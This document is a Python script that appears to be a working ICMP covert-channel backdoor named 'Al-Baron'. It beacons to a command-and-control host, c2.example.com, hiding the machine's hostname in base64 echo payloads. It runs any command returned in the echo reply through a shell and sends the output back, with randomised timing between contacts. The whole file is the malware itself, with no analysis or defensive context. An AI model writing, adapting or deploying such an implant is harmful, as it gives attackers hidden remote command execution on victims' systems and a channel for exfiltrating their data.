#!/usr/bin/env python3
# Al-Baron ICMP beacon — data hidden in echo payloads
from scapy.all import IP, ICMP, sr1, sniff
import base64, uuid, subprocess, time, random, os

C2 = "c2.example.com"
SID = str(uuid.uuid4())[:8].encode()
INTERVAL = 60

def beacon_send(data: bytes):
    payload = b"SHDW" + SID + base64.b64encode(data)
    pkt = IP(dst=C2)/ICMP(type=8)/payload
    resp = sr1(pkt, timeout=5, verbose=0)
    if resp and resp.haslayer(ICMP) and resp[ICMP].type == 0:
        task = bytes(resp[ICMP].payload)
        if task[:4] == b"SHDW":
            return base64.b64decode(task[12:]).decode(errors="ignore")
    return ""

def main():
    while True:
        info = f"{os.uname().nodename}".encode()
        task = beacon_send(info)
        if task and task != "IDLE":
            try:
                out = subprocess.run(task, shell=True, capture_output=True, timeout=30)
                beacon_send(out.stdout + out.stderr)
            except Exception:
                pass
        time.sleep(INTERVAL + random.randint(-10, 10))

if __name__ == "__main__":
    main()
